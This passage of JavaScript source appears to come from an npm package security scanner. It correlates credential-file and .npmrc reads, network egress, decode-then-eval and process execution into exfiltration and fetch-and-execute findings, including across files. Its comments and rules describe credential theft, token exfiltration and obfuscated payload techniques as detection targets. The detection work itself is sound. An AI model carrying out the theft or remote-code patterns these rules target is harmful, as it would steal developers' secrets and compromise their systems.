    // (SENSITIVE_PATH, SENSITIVE_CONFIG_PATH, NPMRC_READ, NPMRC_TOKEN, CODE_DECODE), raw content
    // for the raw-derived signals (NETWORK_EGRESS, DYNAMIC_CODE, PROCESS_EXEC, HOST_OPTION,
    // hardcoded egress). scanSrc is length-preserving, so both live in one coordinate space and
    // distances stay coherent; but sourcing a sanitized signal's positions from raw content (the
    // pre-F-73 bug) would let a comment/URL mention the boolean correctly ignored still contribute
    // a spurious position and satisfy the proximity check. Position arrays are computed lazily and
    // cached, since several rules reuse the same signal's positions.
    let _dynamicCodePositions = null;
    const dynamicCodePositions = () => _dynamicCodePositions || (_dynamicCodePositions = matchAllPositions(content, SIGNAL_PATTERNS.DYNAMIC_CODE).concat(astDynamicCode));
    let _networkEgressPositions = null;
    const networkEgressPositions = () => _networkEgressPositions || (_networkEgressPositions = matchAllPositions(content, SIGNAL_PATTERNS.NETWORK_EGRESS));
    const hardcodedEgressNonRegistryPositions = () => hardcodedEgressCallSites
      .filter(c => !/^https?:\/\/registry\.npmjs\.org\b/i.test(c.url))
      .map(c => c.pos);

    // Intra-module rule: credential file read OR sensitive path + network egress → CRITICAL exfiltration.
    // Bare process.env reads are intentionally excluded here (F-16: false-positive on axios, dotenv, etc.)
    // and handled by the ENV_NETWORK_EGRESS WARN rule below.
    if (signals.sensitivePath && signals.networkEgress) {
      const proximate = withinContext([
        matchAllPositions(scanSrc, SIGNAL_PATTERNS.SENSITIVE_PATH).concat(astSensitivePath),
        networkEgressPositions(),
      ], sepPrefix, CORRELATION_MAX_SEPARATORS, CORRELATION_MAX_CHARS);
      if (proximate) {
        found.push({
          rule: 'CREDENTIAL_EXFILTRATION',
          severity: 'CRITICAL',
          description: 'Module reads sensitive credentials and makes network calls',
        });
      }
    }

    // Intra-module rule: .npmrc read + network egress. CRITICAL when there's a concrete
    // theft signal -- an actual token/password field reference, an explicit host override, or
    // a hardcoded destination that isn't the real npm registry -- AND all three (the .npmrc
    // read, the network call, and the theft signal itself) occur within the proximity window of
    // each other. A hardcoded call-site URL that IS registry.npmjs.org (some legit tools
    // hardcode it instead of building it from config) is downgraded to WARN rather than
    // blocked, same as the config-built-URL case -- the registry host itself isn't a theft
    // signal, only an unusual one. Not-proximate (theft signal present but far from the actual
    // egress call, or absent entirely) downgrades to the same WARN rather than being dropped
    // silently -- this is exactly the vite@8.2.1 false positive: npmrc and a coincidental
    // `host:` object key sit 312 characters apart, but the real network call is 68,519
    // characters from either.
    if (signals.npmrcRead && signals.networkEgress) {
      const theftSignalPresent = signals.npmrcToken || signals.hostOption || signals.hardcodedEgressNonRegistry;
      let proximate = false;
      if (theftSignalPresent) {
        const theftPositions = []
          .concat(signals.npmrcToken ? matchAllPositions(scanSrc, SIGNAL_PATTERNS.NPMRC_TOKEN) : [])
          .concat(signals.hostOption ? matchAllPositions(content, SIGNAL_PATTERNS.HOST_OPTION) : [])
          .concat(signals.hardcodedEgressNonRegistry ? hardcodedEgressNonRegistryPositions() : []);
        proximate = withinContext([
          matchAllPositions(scanSrc, SIGNAL_PATTERNS.NPMRC_READ),
          networkEgressPositions(),
          theftPositions,
        ], sepPrefix, CORRELATION_MAX_SEPARATORS, CORRELATION_MAX_CHARS);
      }
      if (proximate) {
        found.push({
          rule: 'CREDENTIAL_EXFILTRATION',
          severity: 'CRITICAL',
          description: 'Module reads .npmrc and exfiltrates its contents, an auth token, or redirects to a hardcoded/overridden destination',
        });
      } else {
        found.push({
          rule: 'NPMRC_NETWORK_EGRESS',
          severity: 'WARN',
          description: 'Module reads .npmrc and makes network calls (common in npm tooling; monitor for token extraction or a hardcoded exfil destination)',
        });
      }
    }

    // Intra-module rule: infra/browser credential store read + network egress WITH a deliberate
    // exfil destination, all within the proximity window → CRITICAL. The destination gate
    // (hardcoded non-registry host or explicit {host:...} override) is what separates theft from
    // legitimate k8s/docker/browser tooling, which reads these files and connects to a
    // config-derived (not hardcoded-attacker) endpoint.
    if (signals.sensitiveConfigPath && signals.networkEgress &&
        (signals.hardcodedEgressNonRegistry || signals.hostOption)) {
      const theftPositions = []
        .concat(signals.hardcodedEgressNonRegistry ? hardcodedEgressNonRegistryPositions() : [])
        .concat(signals.hostOption ? matchAllPositions(content, SIGNAL_PATTERNS.HOST_OPTION) : []);
      const proximate = withinContext([
        matchAllPositions(scanSrc, SIGNAL_PATTERNS.SENSITIVE_CONFIG_PATH),
        networkEgressPositions(),
        theftPositions,
      ], sepPrefix, CORRELATION_MAX_SEPARATORS, CORRELATION_MAX_CHARS);
      if (proximate) {
        found.push({
          rule: 'CREDENTIAL_EXFILTRATION',
          severity: 'CRITICAL',
          description: 'Module reads an infrastructure/browser credential store and sends it to a hardcoded or overridden destination',
        });
      }
    }

    // Intra-module rule: bare env read + network egress → WARN only (common in normal apps).
    // Escalates to CRITICAL only if a sensitive credential path is also detected (handled above).
    // WARN-tier never blocks (see detector.js), so this is intentionally left whole-file: it
    // carries no false-positive-block risk the way the CRITICAL/HIGH rules below do.
    if (signals.envRead && signals.networkEgress && !signals.sensitiveRead && !signals.sensitivePath) {
      found.push({
        rule: 'ENV_NETWORK_EGRESS',
        severity: 'WARN',
        description: 'Module reads process.env and makes network calls (common pattern; monitor for credential paths)',
      });
    }

    // Intra-module rule: dynamic code generation + process execution, within the proximity
    // window → code injection chain.
    if (signals.dynamicCode && signals.processExec) {
      const proximate = withinContext([
        dynamicCodePositions(),
        matchAllPositions(content, SIGNAL_PATTERNS.PROCESS_EXEC).concat(astProcessExec),
      ], sepPrefix, CORRELATION_MAX_SEPARATORS, CORRELATION_MAX_CHARS);
      if (proximate) {
        found.push({
          rule: 'DYNAMIC_CODE_EXEC_CHAIN',
          severity: 'CRITICAL',
          description: 'Module generates code dynamically and executes system processes',
        });
      }
    }

    // Intra-module rule: decode an encoded blob + evaluate it as code, within the proximity
    // window → the classic "unpack an opaque payload, then eval/Function it" obfuscation (F-31).
    // Bare eval and Buffer.from are WARN-only (F-20 — both appear in legitimate build tools), so
    // neither primitive blocks alone; it's the *decode-then-execute* combination that is the
    // strong malicious signal. HIGH → hard block in index.js (detector.js escalates HIGH to a
    // non-warnOnly block detection). This closes the base64→eval gap where a comment-free
    // `Buffer.from(b64,'base64').toString(); eval(x)` previously fell through as OBSERVE.
    if (signals.dynamicCode && signals.codeDecode) {
      const proximate = withinContext([
        dynamicCodePositions(),
        matchAllPositions(scanSrc, SIGNAL_PATTERNS.CODE_DECODE).concat(astCodeDecode),
      ], sepPrefix, CORRELATION_MAX_SEPARATORS, CORRELATION_MAX_CHARS);
      if (proximate) {
        found.push({
          rule: 'OBFUSCATED_CODE_EXECUTION',
          severity: 'HIGH',
          description: 'Module decodes an encoded blob (base64/hex) and evaluates it as code',
        });
      }
    }

    // Intra-module rule: network egress + dynamic code generation, within the proximity window
    // → fetch-and-execute. The "download a second stage from a remote host and eval/new
    // Function it" pattern (red-team sc-fetch-eval-generic-host / sc-githubusercontent-eval /
    // sc-transfer-sh / sc-s3-remote-config-eval). Both signals are required and neither blocks
    // alone (bare eval is WARN-only per F-20; bare fetch is benign), so this only fires when a
    // module both reaches the network AND evaluates code, close together — a combination that is
    // implausible in reputable packages. HIGH → hard block. Kept below
    // CREDENTIAL_EXFILTRATION/OBFUSCATED so a payload that already matched a more specific rule
    // is not double-reported here (dedup is not required, but the ordering keeps the most
    // descriptive rule first).
    if (signals.networkEgress && signals.dynamicCode) {
      const proximate = withinContext([
        networkEgressPositions(),
        dynamicCodePositions(),
      ], sepPrefix, CORRELATION_MAX_SEPARATORS, CORRELATION_MAX_CHARS);
      if (proximate) {
        found.push({
          rule: 'REMOTE_FETCH_EXEC',
          severity: 'HIGH',
          description: 'Module makes a network request and evaluates code at runtime (remote fetch-and-execute)',
        });
      }
    }

    // Standalone rule: dynamic require with non-literal path → module injection risk
    if (signals.dynamicRequire) {
      found.push({
        rule: 'DYNAMIC_MODULE_LOAD',
        severity: 'MEDIUM',
        description: 'Module uses dynamic require() or module._load with a non-literal path',
      });
    }

    if (found.length > 0) {
      this.violations.push({ filename, violations: found, timestamp: Date.now() });
    }

    return found;
  }

  /**
   * Cross-file correlation: analyzeModule() only ever sees one file's content, so a package that
   * splits a credential read into file A and the exfiltrating network call into file B (or the
   * dynamic-code / process-exec chain, same idea) never has both signals present in any single
   * analyzeModule() call and evades every intra-module rule above. This re-applies the same
   * combination rules across every file's cached signals, pairing signals that land in two
   * DIFFERENT files (same-file combinations are already caught intra-module).
   *
   * SCOPING: when `packageKey` is passed, only files tagged with that key are correlated — this
   * is how the runtime firewall keeps cross-file bounded to one npm package instead of the whole
   * dependency tree (see filePackage). With no key it correlates the whole map, which is the
   * registry batch-scanner contract (it resets() per package, so the whole map IS one package).
   * Callers in either mode MUST reset() between packages.
   *
   * NB (deviation from the original registry rule, carried back on sync): the credential pairing
   * keys on `sensitivePath` (a genuine credential path), NOT bare `sensitiveRead` (any
   * fs.readFile). The looser form false-positived on ordinary multi-file packages that read a
   * template/asset in one file and make an HTTP call in another. This matches the intra-file
   * rule's strictness.
   */
  analyzePackage(packageKey) {
    let entries = [...this.moduleSignals.entries()];
    if (packageKey !== undefined && packageKey !== null) {
      entries = entries.filter(([f]) => this.filePackage.get(f) === packageKey);
    }
    const found = [];
    if (entries.length < 2) return found;

    const filesWhere = (pred) => entries.filter(([, s]) => pred(s)).map(([f]) => f);
    // Strip to basenames in descriptions so scanner-host temp paths never leak; pairing itself
    // stays on full paths (two distinct files can share a basename).
    const base = f => String(f).split(/[\\/]/).pop();
    const crossPair = (as, bs) => {
      for (const a of as) for (const b of bs) if (a !== b) return [base(a), base(b)];
      return null;
    };

    const credFiles = filesWhere(s => s.sensitivePath);
    const npmrcTokenFiles = filesWhere(s => s.npmrcRead && (s.npmrcToken || s.hostOption || s.hardcodedEgressNonRegistry));
    const egressFiles = filesWhere(s => s.networkEgress);
    const dynamicCodeFiles = filesWhere(s => s.dynamicCode);
    const processExecFiles = filesWhere(s => s.processExec);

    const credPair = crossPair(credFiles, egressFiles);
    if (credPair) {
      found.push({
        rule: 'CREDENTIAL_EXFILTRATION_CROSS_FILE',
        severity: 'CRITICAL',
        description: `Package reads sensitive credentials in ${credPair[0]} and makes network calls in ${credPair[1]} -- split across files to evade per-file scanning`,
        files: credPair,
      });
    }

    const npmrcPair = crossPair(npmrcTokenFiles, egressFiles);
    if (npmrcPair) {
      found.push({
        rule: 'CREDENTIAL_EXFILTRATION_CROSS_FILE',
        severity: 'CRITICAL',
        description: `Package reads .npmrc credentials in ${npmrcPair[0]} and makes network calls in ${npmrcPair[1]} -- split across files to evade per-file scanning`,
        files: npmrcPair,
      });
    }

    const execPair = crossPair(dynamicCodeFiles, processExecFiles);
    if (execPair) {
      found.push({
        rule: 'DYNAMIC_CODE_EXEC_CHAIN_CROSS_FILE',
        severity: 'CRITICAL',
        description: `Package generates code dynamically in ${execPair[0]} and executes system processes in ${execPair[1]} -- split across files to evade per-file scanning`,
        files: execPair,
      });
    }

    if (found.length > 0) {
      this.violations.push({ filename: '<package>', violations: found, timestamp: Date.now() });
    }

    return found;
  }

  reset() {
    this.moduleSignals.clear();
    this.filePackage.clear();
    this.violations = [];
  }
}

// SIGNAL_PATTERNS is exported so downstream tooling can iterate the raw signal regexes for
// evidence reconstruction (the registry's watch-changes.js). Keeps this engine a drop-in copy.
module.exports = { BehaviorTracker, SIGNAL_PATTERNS, BEHAVIOR_PRESCREENER_KEYWORDS };
